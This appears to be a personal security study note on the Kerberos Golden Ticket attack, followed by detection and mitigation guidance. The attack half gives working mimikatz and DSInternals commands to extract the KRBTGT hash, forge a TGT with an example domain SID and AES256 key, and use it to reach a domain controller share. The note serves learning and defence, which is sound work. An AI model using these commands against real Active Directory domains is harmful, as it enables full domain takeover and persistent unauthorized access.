
To see : 
[[Kerberos]]
[[PAC - Privilege Attribute Certificate]]

Source : 
https://en.hackndo.com/kerberos-silver-golden-tickets/
https://www.netwrix.com/how_golden_ticket_attack_works.html
https://attack.mitre.org/techniques/T1558/001/

Compromission of the KDC (KRBTGT) hash, it allow to forge any tickets to any resources.

## Step to perform Golden ticket attacks

### Compromission of the hash for the KRBTGT account

#### Extract KrbTgt with mimikatz

```powershell
lsadump::dcsync /domain:contoso.com /user:krbtgt
```
![[Pasted image 20231015173257.png]]

#### Extract KrbTgt with DSInternals

```powershell
Get-ADReplAccount -user KrbTgt -domain contoso –server dc01
```

#### On another system

```powershell
kerberos::ptt C:\ticket.kirbi
```

### Forge kerberos tickets


```powershell
PS> mimikatz.exe kerberos::golden /domain:contoso.com /sid: /rc4: /user:administrator /id:500
```

OR

```powershell
PS> kerberos::golden /user:blue /domain:contoso.com /sid:S-1-5-21-1335734252-711511382-1358492552 /endin:5241600 /aes256:5d8029df60602bf0820ed46831e6ca4eb2a9767ed9fb4f35a741e1ec8bdb2605 /ptt
```

    - **/sid** is the domain sid
    - **/domain** — The FQDN of the domain
    - **/endin** the the validity time for the TGT (normally it is 600 minutes)
    - **/aes256** is the AES256 hash of the KrbTgt account
    - **/ptt** is the Pass The Ticket parameter which means you will inject the crafted ticket in memory, without having to run another command
- 

![[Pasted image 20231015173320.png]]

 `klist` 
    ![[Pasted image 20231015173338.png]]

### Use the forge tickets

Run  `dir \\DC01.contoso.com\C$` and then run `klist`.
    You should see a new ticket for the **cifs/DC01.contoso.com**. The DC thinks this ticket has been requested by Blue, but in your case, it was requested using your crafted TGT ticket.
    And this will work even if blue changes his password. For as long as your TGT is valid for and as long as the KrbTgt key is still the same.


## Detect

Detecting the use of a golden ticket requires analyzing Kerberos tickets for subtle signs of manipulation, such as:  

- Usernames that don’t exist in Active Directory
- Modified group memberships (added or removed)
- Username and RID mismatches
- Weaker than normal encryption types (e.g., RC4 instead of AES-256)
- Ticket lifetimes that exceed the domain maximum (the default domain lifetime is 10 hours but the default assigned by `mimikatz` is 10 years)

The following Windows events can be collected and analyzed to detect possible golden ticket use:  

|   |   |   |
|---|---|---|
|**Event**|**Source**|**Information Provided**|
|Event ID 4769: [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations)|Domain controllers|- Ticket encryption type<br>- Username|
|Event ID 4627: [Audit Group Membership](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-group-membership)|Domain controllers, member computers|- User’s security identifier (SID)<br>- Group memberships|
|Event ID 4624: [Audit Logon](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-logon)|Domain controllers, member computers|- User’s security identifier (SID)<br>- Username source IP (indicating potentially compromised host)|

## Mitigation

The KrbTgt secret doesn’t change automatically 
▪ It might be the same secret used for the last 10 years
▪ Assumed breach! It's possible you may have been compromised 10 years ago, but didn’t have the means to detect it 
▪ Rotate the KrbTgt keys is a good idea
▪ It will help you detect Golden Tickets 
- if they get used with the wrong key, they will generate a specific event on the DCs
▪ Rotate the key twice 
▪ As the previous key is still valid 
▪ But not twice in a row as it will invalidate all issued TGT and impact users and applications 
▪ Unless you are in security incident and want that 
▪ Use the script New-KrbtgtKeys.ps1 to rotate the keys
- Do not allow users to possess administrative privileges across security boundaries. For example, an adversary who compromises a workstation should not be able to escalate their privileges to move on to a domain controller.
- Minimize elevated privileges. For example, organizations often grant Domain Admins membership to service accounts unnecessarily — giving adversaries more accounts to target that will empower them to extract the `KRBTGT` hash.
- [Change the password](https://github.com/microsoft/New-KrbtgtKeys.ps1/blob/master/New-KrbtgtKeys.ps1) for the `KRBTGT` account on a regular schedule, as well as immediately upon any change in personnel responsible for Active Directory administration. Since both the current and previous password of the `KRBTGT` user are used by the KDC to validate Kerberos tickets, the password must be changed twice; the changes should be made 12–24 hours apart to prevent service disruptions.
